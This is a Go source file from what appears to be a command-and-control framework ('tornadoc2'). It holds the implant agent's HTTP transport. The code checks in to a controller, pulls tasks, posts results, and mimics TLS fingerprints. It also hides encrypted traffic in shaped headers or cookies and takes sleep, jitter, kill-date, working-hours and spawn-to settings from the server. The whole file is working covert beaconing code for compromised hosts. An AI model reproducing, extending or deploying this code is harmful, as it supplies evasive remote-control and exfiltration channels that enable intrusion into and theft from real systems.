package transport

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "net/http"
    "strconv"
    "strings"

    "tornadoc2/agent/features"
    "tornadoc2/agent/internal/tlsfp"
    "tornadoc2/agent/protocol"
)

type httpTransport struct {
    baseURL string
    profile Profile
    client  *http.Client
    cookie  string
    shaping *ShapingSpec
}

func NewHTTPTransport(url string, profile Profile,
	tlsCfg *tls.Config, shaping *ShapingSpec) (*httpTransport, error) {

	client, err := tlsfp.NewHTTPClient(
		protocol.WireTLSProfile, tlsCfg)
	if err != nil {
		return nil, fmt.Errorf(
			"http transport: tls profile: %w", err)
	}

	return &httpTransport{
		baseURL: strings.TrimRight(url, "/"),
		profile: profile,
		shaping: shaping,
		client:  client,
	}, nil
}

func (t *httpTransport) Name() string { return "http" }

func (t *httpTransport) applyHeaders(req *http.Request) {
    req.Header.Set("Content-Type", "application/json")
    for k, v := range t.profile.RequestHeaders {
        req.Header.Set(k, v)
    }
    for k, v := range t.profile.ExtraHeaders {
        req.Header.Set(k, v)
    }
    req.Header.Set("User-Agent", t.profile.UserAgent)
}

func (t *httpTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("checkin: marshal: %w", err)
	}

	if wire != nil {
		var err error
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}

	req, err := http.NewRequest("POST",
		t.baseURL+t.profile.BeaconPath, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("checkin: build request: %w", err)
	}
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	wantBeacon := 200
	if t.profile.Status != nil && t.profile.Status.Beacon > 0 {
		wantBeacon = t.profile.Status.Beacon
	}
	if resp.StatusCode == 403 && wantBeacon != 403 {
		return nil, errors.New("checkin refused (403)")
	}
	if resp.StatusCode != wantBeacon {
		return nil, fmt.Errorf("checkin status %d (wanted %d)",
			resp.StatusCode, wantBeacon)
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("checkin: read body: %w", err)
	}

	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		if env := extractEnvelope(resp, t.shaping.CheckinResponse); env != nil {
			respBody = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		raw, err := features.ShapeUnwrap(respBody,
			t.shaping.CheckinResponse)
		if err != nil {
			return nil, fmt.Errorf("checkin shape: %w", err)
		}
		respBody = raw
	}
	var out CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	if out.Cookie == "" {
		return nil, errors.New("checkin reply missing cookie")
	}
	t.cookie = out.Cookie
	return &out, nil
}

func (t *httpTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	if t.cookie == "" {
		return nil, errors.New("tasks: no session cookie")
	}
	req, err := http.NewRequest("GET",
		t.baseURL+t.profile.TasksPath, nil)
	if err != nil {
		return nil, fmt.Errorf("tasks: build request: %w", err)
	}
	t.applyHeaders(req)
	if wire != nil {
		epk, rerr := wire.RotateEphemeral()
		if rerr != nil {
			return nil, fmt.Errorf("tasks: rotate epk: %w", rerr)
		}
		req.Header.Set("X-ECDH-Pubkey", epk)
	}
	cookieName := t.profile.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+t.cookie)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	wantTasks := 200
	if t.profile.Status != nil && t.profile.Status.Tasks > 0 {
		wantTasks = t.profile.Status.Tasks
	}
	if resp.StatusCode != wantTasks {
		return nil, fmt.Errorf("tasks status %d (wanted %d)",
			resp.StatusCode, wantTasks)
	}

    // Scheduling headers. Applied by the caller.
    if v := resp.Header.Get("X-Beacon-Sleep"); v != "" {
        if n, err := strconv.Atoi(v); err == nil && n >= 0 {
            protocol.ScheduleSleep = n
        }
    }
    if v := resp.Header.Get("X-Beacon-Jitter"); v != "" {
        if f, err := strconv.ParseFloat(v, 64); err == nil {
            protocol.ScheduleJitter = f
        }
    }
    if v := resp.Header.Get("X-Beacon-Kill"); v != "" {
        if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
            protocol.ScheduleKill = n
        }
    }
    if v := resp.Header.Get("X-Beacon-WorkStart"); v != "" {
        if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
            protocol.WorkHoursStart = n
        }
    }
    if v := resp.Header.Get("X-Beacon-WorkEnd"); v != "" {
        if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
            protocol.WorkHoursEnd = n
        }
    }
    if v := resp.Header.Get("X-Beacon-SpawnTo"); v != "" {
        protocol.ScheduleSpawnTo = v
    }

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("tasks: read body: %w", err)
	}

	if t.shaping != nil && t.shaping.TasksResponse != nil {
		if env := extractEnvelope(resp, t.shaping.TasksResponse); env != nil {
			body = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		raw, err := features.ShapeUnwrap(body, t.shaping.TasksResponse)
		if err != nil {
			return nil, fmt.Errorf("tasks shape: %w", err)
		}
		body = raw
	}
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *httpTransport) PostResult(r Result, wire *WireSession) error {
	if t.cookie == "" {
		return errors.New("results: no session cookie")
	}
	body, err := json.Marshal(r)
	if err != nil {
		return fmt.Errorf("results: marshal: %w", err)
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	req, err := http.NewRequest("POST",
		t.baseURL+t.profile.ResultsPath, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("results: build request: %w", err)
	}
    cookieName := t.profile.CookieName
    if cookieName == "" {
        cookieName = "sid"
    }
    req.Header.Set("Cookie", cookieName+"="+t.cookie)
    req.Header.Set("Content-Type", "application/json")
    t.applyHeaders(req)

    resp, err := t.client.Do(req)
    if err != nil {
        return err
    }
    resp.Body.Close()
    wantResults := 204
    if t.profile.Status != nil && t.profile.Status.Results > 0 {
        wantResults = t.profile.Status.Results
    }
    if resp.StatusCode != wantResults {
        return fmt.Errorf("results status %d (wanted %d)",
            resp.StatusCode, wantResults)
    }
    return nil
}

func (t *httpTransport) Close() error {
    t.client.CloseIdleConnections()
    return nil
}

func extractEnvelope(resp *http.Response,
	spec *features.ShapeSpec) []byte {

	if spec == nil || spec.Placement == nil {
		return nil
	}
	pl := spec.Placement
	kind := strings.ToLower(pl.Kind)
	switch kind {
	case "header":
		if pl.Name == "" {
			return nil
		}
		v := resp.Header.Get(pl.Name)
		if v == "" {
			return nil
		}
		return []byte(v)
	case "cookie":
		if pl.Name == "" {
			return nil
		}
		for _, c := range resp.Cookies() {
			if c.Name == pl.Name {
				return []byte(c.Value)
			}
		}
		return nil
	default:
		return nil
	}
}